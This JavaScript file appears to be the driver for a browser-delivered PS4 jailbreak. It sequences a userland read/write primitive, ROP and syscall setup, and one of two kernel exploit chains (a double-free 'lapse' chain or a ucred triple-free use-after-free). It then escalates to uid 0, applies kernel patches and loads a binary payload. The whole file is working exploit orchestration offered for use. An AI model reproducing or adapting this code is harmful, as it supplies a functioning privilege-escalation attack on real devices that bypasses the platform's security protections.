function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

let jailbreakRunning = false;

async function doJb() {
  if (jailbreakRunning) {
    logger.debug('Jailbreak request ignored: exploit is already running.');
    return false;
  }

  jailbreakRunning = true;
  exploitChain = getSelectedExploit();
  localStorage.setItem('exploitChain', exploitChain);

  try {
    await load_script('src/misc.js');

    version.init();
    switch (version.console) {
      case 4:
        await load_script('src/ps4/constants.js');
        await load_script('src/ps4/userland.js');
        break;
      case 5:
        // TODO
        break;
      default:
        throw new Error(`Unsupported console: ${version.console}`);
    }

    logger.info('===USERLAND===');

    let rw = undefined;
    if (arw.master === undefined) {
      rw = await init_rw();
    }

    init_arw(rw);
    init_rop();
    init_syscalls();

    await load_script('src/loader.js');
    await load_script('src/workers.js');

    switch (version.console) {
      case 4:
        await load_script('src/ps4/kernel.js');
        break;
      case 5:
        // TODO
        break;
      default:
        throw new Error(`Unsupported console: ${version.console}`);
    }

    await load_script(`src/${exploitChain}.js`);
    logger.info(`===${exploitChain.toUpperCase()}===`);

    if (exploitChain === 'lapse') {
      init();
      try {
        await setup();
        await double_free_reqs2();
        leak_kaddrs();
        double_free_reqs1();
        make_karw();

        inc_karw_pipe_refcnt();

        logger.info('Corrupted context cleanup started...');

        remove_pktinfo_from_so(pktopts_twins[0]);
        remove_rthdr_from_so(pktopts_twins[1]);
        remove_rthdr_from_so(rthdr_twins[0]);

        logger.info('Corrupted context cleanup completed !!');
      } finally {
        cleanup();
      }
    } else {
      init();
      try {
        await setup();
        await ucred_triple_free();
        leak_kqueue();
        await make_karw();

        inc_karw_pipe_refcnt();

        logger.info('Corrupted context cleanup started...');

        for (let i = 0; i < triplets.length; i++) {
          remove_rthdr_from_so(triplets[i]);
        }

        remove_uaf_file();

        logger.info('Corrupted context cleanup completed !!');
      } finally {
        cleanup();
      }
    }

    find_all_proc();

    if (fn.setuid.invoke(0) === -1) {
      jailbreak();

      const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
      const kpatches_buf = await kpatches_rsp.arrayBuffer();
      const kpatches_u8 = new Uint8Array(kpatches_buf);
      kernel_patches(kpatches_u8);

      const bin_rsp = await fetch('src/payload.bin');
      const bin_buf = await bin_rsp.arrayBuffer();
      const bin_u8 = new Uint8Array(bin_buf);
      load_bin(bin_u8);
    }

    logger.info('===END===');
    return true;
  } catch (e) {
    logger.error(e && e.message ? e.message : String(e));
    logger.error(e && e.stack ? e.stack : '');
    throw e;
  } finally {
    jailbreakRunning = false;
  }
}